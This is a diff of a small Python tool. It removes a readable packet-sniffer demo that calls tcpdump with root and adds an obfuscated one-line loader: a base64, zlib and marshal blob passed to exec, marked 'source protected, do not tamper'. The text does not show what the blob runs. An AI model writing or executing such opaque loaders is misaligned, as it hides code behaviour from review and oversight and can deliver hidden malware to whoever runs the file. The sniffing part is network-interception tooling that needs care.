@@ -1,24 +1,3 @@
-# CREATED BY: RAMIZ UDDIN
-import os, time
-
-def tool_header(name):
-    os.system("clear")
-    print("\033[1;36m" + "="*45)
-    print(f"      {name.upper()}")
-    print("      CREATED BY: RAMIZ UDDIN")
-    print("="*45 + "\033[0m")
-
-def run():
-    tool_header("PACKET SNIFFER (ROOT)")
-    print("\033[1;32m[*] Starting Packet Sniffer...")
-    if os.getuid() != 0:
-        print("\n\033[1;31m[!] Sniffing requires ROOT access. Please run with sudo or on rooted device.\033[0m")
-        input("\n[Press Enter to Return]")
-        return
-    
-    # Simple tcpdump command for demo
-    os.system("tcpdump -c 10 -i any")
-    input("\n[Press Enter to Return]")
-
-if __name__ == "__main__":
-    run()
+# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
+# SOURCE PROTECTED. DO NOT TAMPER.
+import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVU+9P00AYvq7XbgwckIggiB5EfpSEhQn4YSIJwkgW41hWSNBBlqY7RiNt57WVrH4xGAMfMcb4N+hfs0hJtOGbH4zfCPgHeNdtMMMSw5vce2/fe++5t/c89xM0Wag+n89R9wnIQOaeAlKbOcLJoX5AQjJPPb8BZZhcB0CJALDBD4PZ+lYESlyJk4Tf7COjck3oAh08Q/8aoOcvFnIhcMWG6ZmzXAMzLzTycqhlll8DufBVlEZXMTDdeh9smRUusyUgiRlfUHewQtyZgXzi0fRD/fF1zBVRYO5gbV7MpRZWU0voyfMkyi08S79Aa0tL6YybuBbqQH5Kl6AfMi1ftCqWjXVfKBPNsH3BKZcxkTgfGoqOLfYnyAd+u22aO4VtrBQxIe00Cemw5ql7C06guJ/eSx+UPHjrBLZVo/c8iGhwsHw48zn5Iflx7jBejQ55cDhYlTw4EQR3juHgObsntfnS+QbP32o8X2jgH0b5lozCC02IrTTR4FPmk7tUe72gGaeZy7bWXDbhR1vhy+L/MaRwxu3JLiw+Ta0iOZNeXk7l0HhuZWVVckcCfTzQ8xObSLYVYmtGCWUV9SW2kWxoW1uYxONxwuTurkeD4oSeH9qsLbJigl85GsEWYoBIUVVsWXGUpeqzMCKOgXY1extZTtFEJkGmgYhp2riIivi1puI4U4XbF81nKYSFUoaNCbJNlMO2Q4xN96atlouOXkaTKkpMoUkNKUZFEgM5EPZ8CHsDvlii9VrRFzSj7NiEMfEFkA62zm7N52kjpJtGbJ+1UpdQZ7VrzIPjgTBmPDh7Em7br+xV3r05VI7CvSeRG9WY6UXKQSB5kYnvkdgfEQhhprxq7L4HR4KtI8dwNDjLjxQKuqIZhYIk1PqCtqbjWrPd9QIm8UKBdLHcZYOROd0sOjt4nvTQT8adNUrdKc9x3C/QeQYF7u5ZLMqNnfYB2HHgHvG3f8Dw+9QpD2B/gPMXsZn9fw=='))))
